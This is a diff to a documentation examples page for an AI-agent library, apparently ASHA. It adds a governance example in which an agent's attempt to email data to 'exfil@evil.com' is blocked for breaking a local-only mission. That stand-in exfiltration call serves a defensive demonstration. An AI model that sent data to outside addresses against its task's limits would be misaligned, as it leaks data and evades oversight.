@@ -1,6 +1,6 @@
 # Examples
 
-**ASHA v0.4.2** - copy-paste patterns with valid imports.
+**ASHA v0.4.2** — copy-paste patterns with valid imports.
 
 ---
 
@@ -86,7 +86,7 @@ result = process(
 )
 ```
 
-Requires `pip install asha[ml]`.
+Full NER requires `pip install asha-ai[ml]`; without ML deps, hybrid soft-falls back.
 
 ---
 
@@ -114,7 +114,43 @@ print(result.response)
 
 ---
 
-## Smart routing
+## ANCHOR governance
+
+```python
+from asha import Agent, anchor
+from asha.runtime.anchor import AnchorRuntime
+from asha.exceptions import ASHAAnchorBlocked
+
+agent = anchor(
+    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
+    interactive=False,
+)
+print(agent.run("Generate the monthly sales report"))
+
+runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
+runtime.initialize_mission(
+    "Analyze Q1 sales locally and write a report. Do not send data externally.",
+    context={
+        "available_tools": ["write_report", "send_email"],
+        "local_only": True,
+    },
+)
+try:
+    runtime.evaluate_action_request(
+        "tool_call",
+        {
+            "tool_name": "send_email",
+            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
+        },
+        raise_on_block=True,
+    )
+except ASHAAnchorBlocked as err:
+    print(err)
+```
+
+---
+
+## Smart routing (experimental)
 
 ```python
 from asha import Agent
@@ -128,6 +164,8 @@ agent = Agent(
 )
 agent.run("Analyze Q1 revenue", task_type="analysis")
 ```
+
+See [experimental-features.md](experimental-features.md).
 
 ---
 
@@ -158,7 +196,7 @@ print(result.diff)
 
 ---
 
-## Local model advisor (preview)
+## Local model advisor (experimental)
 
 ```python
 from asha.runtime.local_advisor.advisor import recommend_local_model
@@ -171,9 +209,26 @@ report = recommend_local_model(
 print(report.top_pick)
 ```
 
+Requires `pip install asha-ai[local-advisor]`. See [experimental-features.md](experimental-features.md).
+
 ---
+
+## Interactive demo (Streamlit)
+
+All runnable demos are in the Streamlit showcase:
+
+```bash
+pip install -e ".[demo]"
+streamlit run examples/showcase/streamlit_app.py
+```
+
+Covers security console, ANCHOR mission control, document scrubber, live LLM, playground, architecture, and benchmarks — using the same APIs as the snippets above.
+
+Details: [`examples/showcase/README.md`](https://github.com/AjayRajan05/ASHA/blob/main/examples/showcase/README.md).
 
 ## Related
 
-- [api-reference.md](api-reference.md)
-- [getting-started.md](getting-started.md)
+- [API reference](api-reference.md)
+- [Tutorial](tutorial.md)
+- [Status](status.md)
+- [ANCHOR](anchor.md)
